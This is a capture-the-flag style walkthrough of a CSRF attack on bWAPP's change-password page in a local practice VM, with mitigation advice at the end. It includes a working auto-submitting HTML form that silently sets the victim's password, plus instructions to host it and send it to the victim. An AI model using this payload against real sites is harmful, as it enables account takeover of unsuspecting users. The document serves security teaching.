# 🛡️ CSRF Exploit – bWAPP Walkthrough

# 🔧 Environment
- **App**: bWAPP (Bee-Box VM)
- **Module**: CSRF → Change Password (low security)
- **Tools**: Browser, Burp Suite

---

# 🎯 Objective
Exploit a CSRF vulnerability to change another user's password **without their knowledge**.

---

# 🔍 Steps to Reproduce

### 1. Login as victim user
URL: `http://localhost/bWAPP/login.php`

Credentials:
- Username: `bee`
- Password: `bug`

Navigate to: `http://localhost/bWAPP/csrf_1.php`

### 2. Inspect Change Password Form

The form sends a POST request like:

```http
POST /bWAPP/csrf_1.php
password_new=test123&password_conf=test123&form=submit

### 3. Create Malicious CSRF Page

```

<!DOCTYPE html>
<html>
  <body>
    <form action="http://localhost/bWAPP/csrf_1.php" method="POST">
      <input type="hidden" name="password_new" value="hacked123">
      <input type="hidden" name="password_conf" value="hacked123">
      <input type="hidden" name="form" value="submit">
      <input type="submit" value="Click me">
    </form>
    <script>
      document.forms[0].submit(); // Auto-submit the form
    </script>
  </body>
</html>

---

Host this file and send it to the victim. Once they open it while logged in, their password gets changed silently.

🧪 Test Verification

Try logging in with:

Username: bee
Password: hacked123

If successful: CSRF vulnerability confirmed

🧰 Mitigation Measures

Anti-CSRF tokens: Use unpredictable tokens tied to session.
SameSite Cookies: Set SameSite=Strict or Lax in cookie headers.
Referer or Origin Checks: Validate that requests originate from the same domain.

Example using token:

html code


<input type="hidden" name="csrf_token" value="abc123">
Server must verify this token before processing.

✅ Summary
CSRF can silently exploit authenticated sessions. Even simple state-changing actions like changing passwords or emails can be hijacked. Always use tokens and strict cookie policies to defend against it.


